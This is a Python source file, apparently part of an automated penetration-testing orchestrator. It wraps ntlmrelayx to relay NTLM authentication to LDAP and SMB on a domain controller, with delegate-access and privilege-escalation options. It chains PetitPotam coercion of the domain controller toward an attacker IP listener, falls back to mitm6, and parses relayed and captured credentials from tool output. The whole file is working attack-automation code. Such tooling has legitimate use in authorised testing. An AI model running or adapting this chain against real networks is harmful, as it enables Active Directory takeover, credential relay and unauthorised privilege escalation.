import asyncio, logging, re, time
from orchestrator.kali_tools_client import kali

logger = logging.getLogger("ntlm_relay")


class NtlmRelayxWrapper:
    async def start_ldap_relay(
        self,
        ldap_target: str,
        listen_port: int = 8445,
        delegate_access: bool = True,
        escalate_user: str = "",
        escalate_computer: str = "",
        socks: bool = False,
        timeout: int = 120,
    ) -> dict:
        args = f"-t ldap://{ldap_target}"
        if delegate_access:
            args += " --delegate-access"
        if escalate_user:
            args += f" --escalate-user {escalate_user}"
        if escalate_computer:
            args += f" --escalate-computer {escalate_computer}"
        if socks:
            args += " -socks"
        args += f" -smb2support -ip 0.0.0.0 -lf /tmp/ntlmrelayx.log"
        args += f" -l /tmp/ntlmrelayx_{listen_port}"

        result = await kali.run(
            "ntlmrelayx",
            args,
            timeout=timeout,
        )
        stdout = (result.get("stdout") or "") + (result.get("stderr") or "")
        relayed = re.findall(r"Relayed\s+(\S+)\s+to\s+(\S+)", stdout)
        captured = re.findall(r"Captured\s+(\S+)\s+from\s+(\S+)", stdout)
        return {
            "success": len(relayed) > 0 or "relayed" in stdout.lower(),
            "relayed_connections": [f"{r[0]} -> {r[1]}" for r in relayed],
            "captured": [f"{c[0]} from {c[1]}" for c in captured],
            "listener": f"0.0.0.0:{listen_port}",
            "ldap_target": ldap_target,
            "raw": stdout[:3000],
        }

    async def start_smb_relay(
        self,
        smb_target: str,
        listen_port: int = 8445,
        socks: bool = False,
        timeout: int = 120,
    ) -> dict:
        args = f"-t smb://{smb_target}"
        if socks:
            args += " -socks"
        args += f" -smb2support -ip 0.0.0.0 -lf /tmp/ntlmrelayx.log"
        args += f" -l /tmp/ntlmrelayx_{listen_port}"

        result = await kali.run("ntlmrelayx", args, timeout=timeout)
        stdout = (result.get("stdout") or "") + (result.get("stderr") or "")
        relayed = re.findall(r"Relayed\s+(\S+)\s+to\s+(\S+)", stdout)
        return {
            "success": len(relayed) > 0,
            "relayed": [f"{r[0]} -> {r[1]}" for r in relayed],
            "listener": f"0.0.0.0:{listen_port}",
            "smb_target": smb_target,
            "raw": stdout[:3000],
        }


class NtlmRelayChain:
    def __init__(self):
        self._relay = NtlmRelayxWrapper()
        self._mitm6 = None
        self._petitpotam = None

    async def ldap_relay_via_petitpotam(
        self,
        dc_ip: str,
        attacker_ip: str,
        domain: str = "",
        username: str = "",
        password: str = "",
        listen_port: int = 8445,
        delegate_access: bool = True,
        timeout: int = 180,
    ) -> dict:
        from orchestrator.ad.petitpotam import PetitPotam
        pp = PetitPotam()

        relay_task = asyncio.create_task(
            self._relay.start_ldap_relay(
                dc_ip, listen_port=listen_port,
                delegate_access=delegate_access, timeout=timeout,
            )
        )
        await asyncio.sleep(2)
        pp_result = await pp.coerce(
            dc_ip, f"{attacker_ip}:{listen_port}",
            username=username, password=password, domain=domain, timeout=timeout,
        )
        relay_result = await relay_task
        combined = pp_result.copy()
        combined["relay"] = relay_result
        combined["success"] = relay_result.get("success") and pp_result.get("success")
        return combined

    async def ldap_relay_via_mitm6(
        self,
        dc_ip: str,
        domain: str,
        listen_port: int = 8445,
        delegate_access: bool = True,
        timeout: int = 180,
    ) -> dict:
        relay_task = asyncio.create_task(
            self._relay.start_ldap_relay(
                dc_ip, listen_port=listen_port,
                delegate_access=delegate_access, timeout=timeout,
            )
        )
        await asyncio.sleep(2)
        from orchestrator.ad.pywhisker_wrapper import Mitm6Wrapper
        m6 = Mitm6Wrapper()
        m6_result = await m6.start(domain, timeout=timeout)
        relay_result = await relay_task
        return {
            "mitm6": m6_result,
            "relay": relay_result,
            "success": relay_result.get("success"),
        }

    async def full_chain(
        self,
        dc_ip: str,
        attacker_ip: str,
        domain: str = "",
        username: str = "",
        password: str = "",
        listen_port: int = 8445,
        timeout: int = 240,
    ) -> dict:
        result = await self.ldap_relay_via_petitpotam(
            dc_ip, attacker_ip, domain=domain,
            username=username, password=password,
            listen_port=listen_port, timeout=timeout,
        )
        if result.get("relay", {}).get("success"):
            return result
        logger.info("  [NTLM relay] PetitPotam relay failed, trying mitm6...")
        fallback = await self.ldap_relay_via_mitm6(
            dc_ip, domain, listen_port=listen_port, timeout=timeout,
        )
        fallback["petitpotam_attempt"] = result
        return fallback
